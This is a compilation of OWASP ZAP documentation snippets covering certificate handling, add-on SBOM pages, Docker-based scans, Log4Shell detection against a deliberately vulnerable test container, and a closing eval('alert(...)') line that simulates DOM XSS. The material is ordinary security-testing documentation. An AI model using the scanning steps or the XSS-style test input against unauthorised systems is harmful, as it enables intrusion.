DESCRIPTION: Command line options for managing the Root CA certificate in ZAP, including loading certificates and dumping public/private keys.

LANGUAGE: bash
CODE:
-certload <path>      Loads the Root CA certificate from the specified file name
-certpubdump <path>   Dumps the Root CA public certificate into the specified file name, this is suitable for importing into browsers
-certfulldump <path>  Dumps the Root CA full certificate (including the private key) into the specified file name, this is suitable for importing into ZAP

----------------------------------------

TITLE: YAML Configuration for Passive Scanner Rules SBOM
DESCRIPTION: YAML frontmatter and configuration defining the Software Bill of Materials (SBOM) for the passive scanner rules add-on. Lists all dependencies including libraries, frameworks and tools with their respective versions and licenses.

LANGUAGE: yaml
CODE:
# This page was automatically generated from the add-on's SBOM.
title: Passive scanner rules Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: pscanrules
    version: '63'
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/pscanrules-v63/bom.json
  components:
  - name: apiguardian-api
    version: 1.1.2
    licenses: Apache-2.0

----------------------------------------

TITLE: YAML Documentation Page Configuration
DESCRIPTION: YAML front matter configuration that defines the structure and layout of the ZAP documentation landing page. It organizes documentation into hierarchical groups with headers and associated links.

LANGUAGE: yaml
CODE:
type: page
title: Documentation
layout: group-links
groups:
  - header: 'Guides'
    links:
      - name: 'Getting Started Guide'
        link: /getting-started/
        desc: a good place to start if you are new to ZAP
    
      - name: 'Getting Further Guides'
        link: /docs/getting-further/
        desc: in depth guides covering different ways you can use ZAP
    
      - name: 'Desktop User Guide'
        link: /docs/desktop/
        desc: the help included with the ZAP desktop application
    
      - name: 'ZAP Developer Guide'
        link: /docs/developer/
        desc: ZAP documentation for developers
    
      - name: 'Contributing Guide'
        link: /docs/contribute/
        desc: lots more details on how you can get involved

      - name: 'FAQ'
        link: /faq/
        desc: Frequently Asked Questions
    
      - name: 'ZAPping the OWASP Top 10 (2021)'
        link: /docs/guides/zapping-the-top-10-2021
        desc: a guide mapping Top 10 items to ZAP functionality that can assist IT security personnel

----------------------------------------

TITLE: Defining YAML Frontmatter for Replacer Add-on SBOM
DESCRIPTION: This YAML block defines metadata and component information for the Replacer Add-on's Software Bill of Materials (SBOM). It includes the add-on ID, version, SBOM format, download URL, and a list of components with their names, versions, and licenses.

LANGUAGE: yaml
CODE:
---
# This page was automatically generated from the add-on's SBOM.
title: Replacer Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: replacer
    version: '20'
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/replacer-v20/bom.json
  components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain
  - name: apiguardian-api
    version: 1.1.2
    licenses: Apache-2.0
  # ... (truncated for brevity)
  - name: zap
    version: 2.16.0-SNAPSHOT
    licenses: Apache-2.0
---

----------------------------------------

TITLE: Starting Bash Shell in ZAP Docker Container
DESCRIPTION: This command starts a bash shell in the ZAP Docker container, allowing for manual execution of ZAP commands and access to log files for troubleshooting.

LANGUAGE: bash
CODE:
docker run -i -t ghcr.io/zaproxy/zaproxy:stable bash

----------------------------------------

TITLE: YAML Configuration for Passive Scanner Add-on SBOM
DESCRIPTION: YAML configuration file defining the Software Bill of Materials for the Passive Scanner Add-on. It includes metadata about the add-on and a detailed list of component dependencies with their versions and licenses.

LANGUAGE: yaml
CODE:
# This page was automatically generated from the add-on's SBOM.
title: Passive Scanner Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: pscan
    version: 0.2.0
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/pscan-v0.2.0/bom.json
  components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain

----------------------------------------

TITLE: YAML Configuration for Python Scripting Add-on SBOM
DESCRIPTION: YAML configuration file defining metadata and component dependencies for the Python Scripting add-on. Lists all software components with their names, versions, and license information.

LANGUAGE: yaml
CODE:
# This page was automatically generated from the add-on's SBOM.
title: Python Scripting Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: jython
    version: '15'
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/jython-v15/bom.json
  components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain
  [...]

----------------------------------------

TITLE: API Response Example - Alerts Summary
DESCRIPTION: Example showing the JSON response format for the new alertsSummary API endpoint which provides alert counts per risk level.

LANGUAGE: json
CODE:
{"High":0,"Low":132,"Medium":39,"Informational":153}

----------------------------------------

TITLE: Installing Flagger Load Tester
DESCRIPTION: Installs the Flagger load tester using Helm with required RBAC permissions

LANGUAGE: bash
CODE:
helm repo add flagger https://flagger.app

LANGUAGE: bash
CODE:
helm install flagger-loadtester flagger/loadtester --namespace zap-demo --set rbac.create=true --set rbac.rules[0].apiGroups[0]="batch" --set "rbac.rules[0].resources={jobs,jobs/log,cronjobs,cronjobs/log}" --set "rbac.rules[0].verbs={get,create,list,watch}"

----------------------------------------

TITLE: YAML Configuration for Script Console Add-on SBOM
DESCRIPTION: YAML frontmatter and configuration defining the SBOM metadata, format, and component list for the Script Console Add-on. Includes version information, download URL, and detailed component dependencies with their respective versions and licenses.

LANGUAGE: yaml
CODE:
# This page was automatically generated from the add-on's SBOM.
title: Script Console Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: scripts
    version: 45.8.0
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/scripts-v45.8.0/bom.json
  components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain
  - name: apiguardian-api
    version: 1.1.2
    licenses: Apache-2.0
  # ... additional components omitted for brevity

----------------------------------------

TITLE: Running ZAP Baseline Scan with Noir-discovered Endpoints using Docker
DESCRIPTION: This code snippet shows how to use Noir to discover endpoints and then run a ZAP baseline scan using the zaproxy/zap-stable Docker image. It demonstrates passing the OAS file obtained from Noir to the ZAP scan process.

LANGUAGE: sh
CODE:
# Discovering endpoints
noir -b ~/app_source -f oas3 --no-log -o doc.json

# Scan with zaproxy/zap-stable
docker run -t -v $(pwd)/doc.json:/zap/doc.json \
  zaproxy/zap-stable zap-baseline.py -t <TARGET> \
  -z "-openapifile /zap/doc.json -openapitargeturl <TARGET>"

----------------------------------------

TITLE: Checking Target Connectivity with curl in ZAP Docker Container
DESCRIPTION: This command runs a curl request to a target URL from within the ZAP Docker container to verify network connectivity. It helps diagnose if connection issues are Docker-related or specific to ZAP.

LANGUAGE: bash
CODE:
docker run -t ghcr.io/zaproxy/zaproxy:stable curl https://www.example.com

----------------------------------------

TITLE: YAML Configuration for Server-Sent Events Add-on SBOM
DESCRIPTION: YAML formatted software bill of materials listing all dependencies, versions and licenses used in the SSE add-on. The SBOM follows the CycloneDX format and includes download information.

LANGUAGE: yaml
CODE:
title: Server-Sent Events Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: sse
    version: '13'
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/sse-v13/bom.json
  components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain

----------------------------------------

TITLE: YAML Configuration for Import/Export Add-on SBOM
DESCRIPTION: YAML configuration file defining metadata and component dependencies for the Import/Export add-on. Lists component names, versions, and their associated licenses in CycloneDX format.

LANGUAGE: yaml
CODE:
title: Import/Export Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: exim
    version: 0.13.0
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/exim-v0.13.0/bom.json
  components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain

----------------------------------------

TITLE: Authorization Detection Method API Response Format Change
DESCRIPTION: Shows the updated JSON response format for the authorization detection method API endpoint, where data is now wrapped in an authorizationDetectionMethod object.

LANGUAGE: json
CODE:
{"authorizationDetectionMethod":{"statusCode":"-1"..."headerRegex":""}}

----------------------------------------

TITLE: Selenium Add-on SBOM Definition in YAML
DESCRIPTION: YAML configuration defining the Software Bill of Materials (SBOM) for the Selenium add-on. Contains metadata about the add-on and a comprehensive list of all dependencies with their versions and licenses.

LANGUAGE: yaml
CODE:
title: Selenium Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: selenium
    version: 15.35.0
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/selenium-v15.35.0/bom.json
  components:
  - name: apiguardian-api
    version: 1.1.2
    licenses: Apache-2.0

----------------------------------------

TITLE: Encoding gRPC Message as Base64
DESCRIPTION: An example of a Base64 encoded form of a binary Protobuf message received by ZAP. This encoded message can be decoded and displayed using the gRPC add-on.

LANGUAGE: base64
CODE:
AAAAAIYJZCZMzMzcXkAVrseHQhi5YCDqrcDlJCixqAM1QEIPADOQSGVsbG8sIFByb3RvYnVmIUJMCgsxMjMgTWFpbiBTdBIGTX1DaXR5GgUxMjMONSIuCgtIZWxsbyBXb3JsZBIITXkgV29ybGQaCllvdXIgV29ybGQiCU91ciBXb3JsZEjqrcDLJA==

----------------------------------------

TITLE: Defining YAML Front Matter for Tips and Tricks Add-on SBOM
DESCRIPTION: This YAML block defines metadata and SBOM information for the Tips and Tricks Add-on. It includes the add-on ID, version, SBOM format, download URL, and a comprehensive list of components with their names, versions, and licenses.

LANGUAGE: yaml
CODE:
# This page was automatically generated from the add-on's SBOM.
title: Tips and Tricks Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: tips
    version: '14'
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/tips-v14/bom.json
  components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain
  - name: asm
    version: '9.6'
    licenses: BSD-3-Clause
  # ... [additional components omitted for brevity]
  - name: zap
    version: 2.16.0-SNAPSHOT
    licenses: Apache-2.0

----------------------------------------

TITLE: Executing ZAP Full Scan with Docker (With File Parameters)
DESCRIPTION: Example command to run the ZAP full scan script using Docker with file parameters. This demonstrates how to mount a local directory to access configuration and report files.

LANGUAGE: bash
CODE:
docker run -v $(pwd):/zap/wrk/:rw -t ghcr.io/zaproxy/zaproxy:stable zap-full-scan.py \
    -t https://www.example.com -g gen.conf -r testreport.html

----------------------------------------

TITLE: YAML Configuration for Zest Add-on SBOM
DESCRIPTION: YAML front matter configuration defining metadata and component dependencies for the Zest add-on SBOM. Lists all third-party libraries, their versions, and associated licenses used by the add-on.

LANGUAGE: yaml
CODE:
# This page was automatically generated from the add-on's SBOM.
title: Zest - Graphical Security Scripting Language Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: zest
    version: 48.4.0
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/zest-v48.4.0/bom.json
  components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain

----------------------------------------

TITLE: Listing SBOM Components in YAML
DESCRIPTION: This YAML snippet shows the structure for listing components in the SBOM, including their names, versions, and licenses. It demonstrates the format for multiple components.

LANGUAGE: yaml
CODE:
components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain
  - name: apiguardian-api
    version: 1.1.2
    licenses: Apache-2.0
  - name: asm
    version: '9.6'
    licenses: BSD-3-Clause

----------------------------------------

TITLE: Release Notes Table Link Structure
DESCRIPTION: Markdown table structure showing links to related ZAP documentation sections

LANGUAGE: markdown
CODE:
|   |                                     |                                                           |
|---|-------------------------------------|-----------------------------------------------------------|
|   | [Introduction](/docs/desktop/)      | the introduction to ZAP                                   |
|   | [Releases](/docs/desktop/releases/) | the full set of releases                                  |
|   | [Credits](/docs/desktop/credits/)   | the people and groups who have made this release possible |

----------------------------------------

TITLE: Configuring RSA Request Signing Headers in Python
DESCRIPTION: Configuration constants for header names used in the RSA request signing process. These constants define the names of headers used for the signature, nonce value, and timestamp.

LANGUAGE: python
CODE:
SIGNATURE_HEADER = 'X-Signature'
NONCE_HEADER = 'X-Nonce-Value'
NONCE_CREATED_AT_HEADER = 'X-Nonce-Created-At'

----------------------------------------

TITLE: Example Output of ZAP Automation Framework Execution
DESCRIPTION: This snippet shows the expected output when running the ZAP Automation Framework with environment variables. It demonstrates the execution of a script that accesses and prints the value of the 'MyVar' environment variable.

LANGUAGE: bash
CODE:
Job script set action = add
Job script set type = standalone
Job script set engine = ECMAScript : Graal.js
Job script set name = print-env-vars.js
Job script set inline = print(Java.type("java.lang.System").getenv("MyVar"));

Job script set action = run
Job script set type = standalone
Job script set name = print-env-vars.js
Job script started
Job: script Start action: add
Job script finished, time taken: 00:00:00
Job script started
Job: script Start action: run
Test 1 2 3
Job script finished, time taken: 00:00:00
Automation plan succeeded!

----------------------------------------

TITLE: Running ZAPit Against a URL
DESCRIPTION: Command to execute ZAPit against a specified URL (example.com in this case) for quick reconnaissance scanning.

LANGUAGE: bash
CODE:
./zap.sh -cmd -zapit https://www.example.com

----------------------------------------

TITLE: Defining YAML Front Matter for Google Summer of Code Page
DESCRIPTION: YAML front matter for a page about ZAP's Google Summer of Code projects. It defines the page title, type, layout, and a list of links to specific years and projects. It also sets cascading properties for editable content and breadcrumbs.

LANGUAGE: yaml
CODE:
---
title: "Google Summer of Code"
type: page
layout: links
links:
  - name: 'Advice and Guidance'
    link: advice-and-guidance/
    desc: How to take part

  - name: '2024'
    link: 2024/
    desc: Unfortunately ZAP was not selected as a mentoring organisation

  - name: '2023'
    link: 2023/
    desc: Browser Recorder and Postman Support

  - name: '2022'
    link: 2022/
    desc: Param Digger

  - name: '2021'
    link: 2021/
    desc: Out-of-band Application Security Testing, Retesting Alerts

  - name: '2020'
    link: 2020/
    desc: GraphQL Support 

  - name: '2019'
    desc: Scanning websockets (phase 2) 

  - name: '2018'
    desc: Authentication helper and Scanning websockets (phase 1) 

  - name: '2016'
    desc: Bug tracker support 

  - name: '2014'
    desc: Advanced fuzzing, SOAP scanning, Advanced Access Control testing

  - name: '2013'
    desc: BIRT Reporting, Zest enhancements, Enhanced HTTP Session Handling, SAML 2.0 support

  - name: '2012'
    desc: Ajax Spider, Crawler redesign with session support, WebSocket testing

cascade:
  EditableContent: true
  addBreadcrumbs: true
---

----------------------------------------

TITLE: Setting Client Certificate Options in ZAP CLI
DESCRIPTION: Command line options for configuring client certificate settings in ZAP, including specifying certificate path, password, index and persistence.

LANGUAGE: bash
CODE:
-config certificate.use=true
-config certificate.pkcs12.path=/path/to/file.p12
-config certificate.pkcs12.password=WhateverThePasswordIs
-config certificate.pkcs12.index=1
-config certificate.persist=true

----------------------------------------

TITLE: Defining YAML Frontmatter for Fuzzer Add-on SBOM
DESCRIPTION: This YAML frontmatter defines metadata for the Fuzzer Add-on SBOM page, including title, type, weight, and cascade information. It also specifies the SBOM format, download URL, and lists all components with their names, versions, and licenses.

LANGUAGE: yaml
CODE:
---
# This page was automatically generated from the add-on's SBOM.
title: Fuzzer Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: fuzz
    version: 13.15.0
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/fuzz-v13.15.0/bom.json
  components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain
  - name: apiguardian-api
    version: 1.1.2
    licenses: Apache-2.0
  # ... (truncated for brevity)
  - name: zap
    version: 2.16.0-SNAPSHOT
    licenses: Apache-2.0
---

----------------------------------------

TITLE: Defining YAML Frontmatter for GraalVM JavaScript Add-on SBOM
DESCRIPTION: This YAML frontmatter defines metadata for the GraalVM JavaScript Add-on SBOM page, including title, type, weight, and addon details. It also specifies the SBOM format, download URL, and lists all components with their versions and licenses.

LANGUAGE: yaml
CODE:
---
# This page was automatically generated from the add-on's SBOM.
title: GraalVM JavaScript Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: graaljs
    version: 0.9.0
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/graaljs-v0.9.0/bom.json
  components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain
  - name: apiguardian-api
    version: 1.1.2
    licenses: Apache-2.0
  # ... (truncated for brevity)
  - name: zap
    version: 2.16.0-SNAPSHOT
    licenses: Apache-2.0
---

----------------------------------------

TITLE: Referencing User Defined Attacks Script in ZAP
DESCRIPTION: Link to the User defined attacks.js script in the ZAP community scripts repository, which provides an easy starting point for implementing custom active scan attacks.

LANGUAGE: plaintext
CODE:
https://github.com/zaproxy/community-scripts/blob/main/active/User%20defined%20attacks.js

----------------------------------------

TITLE: Creating DsStore Instance in ZAP Spider
DESCRIPTION: This Java code creates a new instance of the DsStore class generated by Kaitai Struct compiler to parse the .DS_Store file content.

LANGUAGE: java
CODE:
DsStore dsStore = null;
try {
    dsStore =
            new DsStore((new ByteBufferKaitaiStream(message.getResponseBody().getBytes())));
} catch (Exception ex) {
    getLogger().debug(ex.getMessage());
    return false;
}

----------------------------------------

TITLE: ZAP API Endpoints for Alert Management
DESCRIPTION: API endpoints available in ZAP for updating alert risk and confidence levels. These endpoints allow programmatic management of alert attributes including risk level, confidence, and other metadata.

LANGUAGE: bash
CODE:
/alert/updateAlert (id* name* riskId* confidenceId* description* param attack otherInfo solution references evidence cweId wascId )
/alert/updateAlertsConfidence (ids* confidenceId* ) 
/alert/updateAlertsRisk (ids* riskId* ) 

----------------------------------------

TITLE: YAML Configuration for Forced Browse Add-on SBOM
DESCRIPTION: This YAML configuration defines the metadata and component list for the Forced Browse Add-on's Software Bill of Materials (SBOM). It includes the add-on ID, version, SBOM format, download URL, and a comprehensive list of components with their names, versions, and licenses.

LANGUAGE: yaml
CODE:
# This page was automatically generated from the add-on's SBOM.
title: Forced Browse Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: bruteforce
    version: '17'
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/bruteforce-v17/bom.json
  components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain
  - name: apiguardian-api
    version: 1.1.2
    licenses: Apache-2.0
  # ... [additional components omitted for brevity]
  - name: zap
    version: 2.16.0-SNAPSHOT
    licenses: Apache-2.0

----------------------------------------

TITLE: ZAP Header Script Reference
DESCRIPTION: Reference to AddZapHeader.js script that adds an identifier header (X-ZAP-Initiator) to all ZAP traffic for identification and WAF exception purposes.

LANGUAGE: text
CODE:
X-ZAP-Initiator: 3

----------------------------------------

TITLE: Importing ZAP Root CA Certificate into Java Keystore
DESCRIPTION: Command to import the ZAP root CA certificate into the Java cacerts keystore. Requires JAVA_HOME environment variable to be set and the ZAP root certificate to be exported to '~/zap_root_ca.cer'. Uses the keytool utility that comes with Java.

LANGUAGE: bash
CODE:
keytool -importcert -keystore $JAVA_HOME/lib/security/cacerts -file ~/zap_root_ca.cer -alias owasp_zap_root_ca

----------------------------------------

TITLE: Listing SBOM Components in YAML
DESCRIPTION: This YAML snippet lists the components included in the SBOM, including their names, versions, and licenses. It provides a comprehensive overview of all dependencies used in the OAST Support Add-on.

LANGUAGE: yaml
CODE:
components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain
  - name: apiguardian-api
    version: 1.1.2
    licenses: Apache-2.0
  # ... (additional components omitted for brevity)
  - name: zap
    version: 2.16.0-SNAPSHOT
    licenses: Apache-2.0

----------------------------------------

TITLE: Setting Zest Script Variable for Username Replacement
DESCRIPTION: Shows how to set a variable in a Zest script POST request to replace the username with values from a file loop.

LANGUAGE: plaintext
CODE:
username={{variable_name}}

----------------------------------------

TITLE: Querying Add-on Versions via ZAP CLI
DESCRIPTION: Command line instruction to display version information for all installed ZAP add-ons, along with system information like Java version, operating system, and installation directories.

LANGUAGE: bash
CODE:
zap.bat -suppinfo

OWASP ZAP
Version: 2.8.0
Installed Add-ons: [[id=alertFilters, version=8.0.0], [id=ascanrules, version=33.0.0], [id=bruteforce, version=8.0.0]
...snip...
[id=tips, version=6.0.0], [id=webdriverwindows, version=10.0.0], [id=websocket, version=19.0.0], [id=zest, version=29.0.0]]
Operating System: Windows 7
Java Version: Oracle Corporation 1.8.0_191
System's Locale: en_CA
Display Locale: en_GB
Format Locale: en_GB
ZAP Home Directory: C:\Users\someone\OWASP ZAP\
ZAP Installation Directory: C:\Program Files\OWASP\Zed Attack Proxy\.\
Look and Feel: Metal (javax.swing.plaf.metal.MetalLookAndFeel)

----------------------------------------

TITLE: Running Vulnerable Docker Container for Log4Shell Testing
DESCRIPTION: Command to start a deliberately vulnerable Docker container for testing Log4Shell detection.

LANGUAGE: bash
CODE:
docker run -p 8000:8080 ghcr.io/christophetd/log4shell-vulnerable-app

----------------------------------------

TITLE: YAML Configuration for Client Side Integration Add-on SBOM
DESCRIPTION: YAML configuration file defining metadata and component dependencies for the Client Side Integration Add-on's Software Bill of Materials. Includes component names, versions, and license information.

LANGUAGE: yaml
CODE:
title: Client Side Integration Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: client
    version: 0.14.0
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/client-v0.14.0/bom.json
  components:
  - name: apiguardian-api
    version: 1.1.2
    licenses: Apache-2.0

----------------------------------------

TITLE: Example URLs with Data in Path
DESCRIPTION: Sample URLs demonstrating data-driven content where data appears in the URL path segments instead of parameters.

LANGUAGE: plaintext
CODE:
https://www.example.com/app/company1/aaa?ddd=eee
https://www.example.com/app/company2/aaa?ddd=fff
https://www.example.com/app/company3/aaa?ddd=ggg

----------------------------------------

TITLE: Creating Dockerfile for ZAP with Chrome
DESCRIPTION: This Dockerfile extends the ZAP stable image and installs Chrome. It switches to root user for installation, then back to zap user for security.

LANGUAGE: dockerfile
CODE:
FROM --platform=linux/amd64 softwaresecurityproject/zap-stable:latest

USER root

RUN apt-get update && \
	wget -q https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb && \
	apt-get install -y ./google-chrome-stable_current_amd64.deb && \
	rm -rf /var/lib/apt/lists/*

USER zap

----------------------------------------

TITLE: OpenAPI Support Add-on SBOM Configuration in YAML
DESCRIPTION: YAML configuration defining the Software Bill of Materials (SBOM) for the OpenAPI Support Add-on, including metadata and a detailed list of components with their versions and licenses.

LANGUAGE: yaml
CODE:
# This page was automatically generated from the add-on's SBOM.
title: OpenAPI Support Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: openapi
    version: '44'
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/openapi-v44/bom.json
  components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain

----------------------------------------

TITLE: Markdown Front Matter Configuration
DESCRIPTION: YAML front matter configuration for the page layout and type settings

LANGUAGE: yaml
CODE:
---
layout: single
type: page
title: Redirects and Resources
---

----------------------------------------

TITLE: ZAP History Tab Display Example
DESCRIPTION: Example showing how the History tab displays requests with gaps in IDs, where IDs 3 and 4 are used internally for directory nodes.

LANGUAGE: text
CODE:
1  GET    http://www.example.com/
2  GET    http://www.example.com/images/123/456.jpg
5  GET    http://www.example.com/xyz

----------------------------------------

TITLE: Setting Up ZAP with Required Add-ons for Log4Shell Detection
DESCRIPTION: ZAP command to set up a new configuration directory and install/update required add-ons for Log4Shell detection.

LANGUAGE: bash
CODE:
./zap.sh -cmd -dir log4shell -addonupdate -addoninstall ascanrulesAlpha

----------------------------------------

TITLE: Video Resources Page Structure in YAML
DESCRIPTION: YAML front matter defining the page structure and navigation groups for ZAP video resources. Includes sections for different video series with titles, links and descriptions.

LANGUAGE: yaml
CODE:
type: page
title: Videos
layout: group-links
groups:
  - header: 'Official ZAP Videos'
    links:
      - name: 'ZAP Chat'
        link: /zap-chat/
        desc: A new and ongoing set of videos focusing on ZAP features, new and old.

      - name: 'ZAP Deep Dive Series'
        link: /zap-deep-dive/
        desc: A series of longer videos about ZAP features

      - name: 'ZAPCon 2022'
        link: /zapcon-2022/
        desc: All of the videos from ZAPCon 2022

      - name: 'ZAPCon 2021'
        link: /zapcon-2021/
        desc: All of the videos from ZAPCon 2021

      - name: 'ZAP in Ten'
        link: /zap-in-ten/
        desc:  An series of short videos about different ZAP features produced in conjunction with All Day DevOps

      - name: 'ADDO ZAP Automation Workshop'
        link: /addo-auth-workshop/
        desc: A set of ZAP workshops on automation and authentication produced in conjunction with All Day DevOps

      - name: 'All Official ZAP Videos'
        link: /videos-list/
        desc: All of the Official ZAP videos, tagged and searchable

----------------------------------------

TITLE: Defining YAML Front Matter for Value Generator Add-on SBOM
DESCRIPTION: This YAML front matter defines metadata for the Value Generator Add-on's Software Bill of Materials (SBOM). It specifies the add-on ID, version, SBOM format, and download URL.

LANGUAGE: yaml
CODE:
---
# This page was automatically generated from the add-on's SBOM.
title: Value Generator Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: formhandler
    version: 6.7.0
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/formhandler-v6.7.0/bom.json
  components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain
  # ... [additional components omitted for brevity]
  - name: zap
    version: 2.16.0-SNAPSHOT
    licenses: Apache-2.0
---

----------------------------------------

TITLE: Data Driven Content Examples
DESCRIPTION: URL examples demonstrating how path elements can contain data rather than structural information.

LANGUAGE: plaintext
CODE:
https://www.example.com/app/company1/aaa?ddd=eee
https://www.example.com/app/company2/aaa?ddd=fff
https://www.example.com/app/company3/aaa?ddd=ggg

----------------------------------------

TITLE: Building Docker Image for ZAP with Chrome
DESCRIPTION: This bash command builds the Docker image with ZAP and Chrome, tagging it as 'zap-chrome'.

LANGUAGE: bash
CODE:
docker build -f Dockerfile --platform linux/amd64 -t zap-chrome .

----------------------------------------

TITLE: Diff Add-on SBOM Configuration in YAML
DESCRIPTION: YAML frontmatter configuration defining the SBOM metadata and component listing for the Diff add-on. Includes page metadata, addon identification, and a detailed component list with versions and licenses.

LANGUAGE: yaml
CODE:
# This page was automatically generated from the add-on's SBOM.
title: Diff Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: diff
    version: '17'
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/diff-v17/bom.json
  components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain
  - name: asm
    version: '9.6'
    licenses: BSD-3-Clause
  # ... [Additional components truncated for brevity]

----------------------------------------

TITLE: Running ZAP Scan for Log4Shell Detection
DESCRIPTION: Command to run ZAP against the demo app using the configured files for Log4Shell detection.

LANGUAGE: bash
CODE:
./zap.sh -cmd -dir log4shell -configfile /path/to/log4shell.conf -autorun /path/to/log4shell.yaml

----------------------------------------

TITLE: Generating Release Notes from JSON File
DESCRIPTION: This command runs a Python script to generate release notes from the previously fetched JSON file. The script's date should be adjusted before running.

LANGUAGE: shell
CODE:
./generate-release-notes.py releases.json

----------------------------------------

TITLE: Configuring ZAP Logging to Mitigate Log4Shell Vulnerability
DESCRIPTION: This code snippet shows how to configure ZAP logging to turn off all logging levels, which is recommended as a precautionary measure for users who cannot immediately update to ZAP 2.11.1.

LANGUAGE: text
CODE:
rootLogger.level = off

logger.paros.level = off

logger.zap.level = off

----------------------------------------

TITLE: YAML Configuration for Retire.js Add-on SBOM
DESCRIPTION: YAML frontmatter and configuration defining the Retire.js add-on's Software Bill of Materials (SBOM), including metadata and a comprehensive list of components with their versions and licenses.

LANGUAGE: yaml
CODE:
# This page was automatically generated from the add-on's SBOM.
title: Retire.js Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: retire
    version: 0.46.0
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/retire-v0.46.0/bom.json
  components:
  - name: apiguardian-api
    version: 1.1.2
    licenses: Apache-2.0
  [... additional components truncated for brevity ...]

----------------------------------------

TITLE: Zest Command-line Recording via Firefox Developer Toolbar
DESCRIPTION: Commands used in Firefox Developer Toolbar (Shift F2) to start and stop recording Zest scripts through the Plug-n-Hack integration.

LANGUAGE: text
CODE:
zap record on global
zap record off global

----------------------------------------

TITLE: Displaying ZAP Sites Tree Structure
DESCRIPTION: Example showing how ZAP organizes the Sites tree structure when accessing a deep URL path, demonstrating the automatic creation of parent directory nodes.

LANGUAGE: text
CODE:
[+] http://www.example.com
   [+] images
       [+] 123
           [ ] 456.jpg

----------------------------------------

TITLE: YAML Configuration for Alert Filters Add-on SBOM
DESCRIPTION: This YAML configuration defines metadata for the Alert Filters Add-on SBOM page, including the add-on ID, version, and SBOM format. It also lists all the components (dependencies) used in the add-on, along with their versions and licenses.

LANGUAGE: yaml
CODE:
# This page was automatically generated from the add-on's SBOM.
title: Alert Filters Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: alertFilters
    version: '23'
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/alertFilters-v23/bom.json
  components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain
  - name: apiguardian-api
    version: 1.1.2
    licenses: Apache-2.0
  # ... (truncated for brevity)
  - name: zap
    version: 2.16.0-SNAPSHOT
    licenses: Apache-2.0

----------------------------------------

TITLE: Common Testing Components Table in Markdown
DESCRIPTION: Markdown table showing common ZAP testing components that can be used across all OWASP Top 10 categories, including manual tools like proxy interceptor, request editor, and scripting capabilities.

LANGUAGE: markdown
CODE:
| Common Components |  | The 'common components' can be used for pretty much everything, so can be used to help detect all of the Top 10 |
|   | Manual | Manipulator-in-the-middle proxy |
|   | Manual | Manual request / resend |
|   | Manual | Scripts |
|   | Manual | Community Scripts |
|   | Manual | Search |

----------------------------------------

TITLE: Simulating DOM XSS with eval in JavaScript Console
DESCRIPTION: Demonstrates how to use eval to simulate a DOM XSS scenario and how Eval Villain detects it. This snippet shows a basic example of using eval with a needle ('asdf') that Eval Villain highlights as interesting.

LANGUAGE: javascript
CODE:
eval('alert("Welcome Back User: asdf");');

----------------------------------------

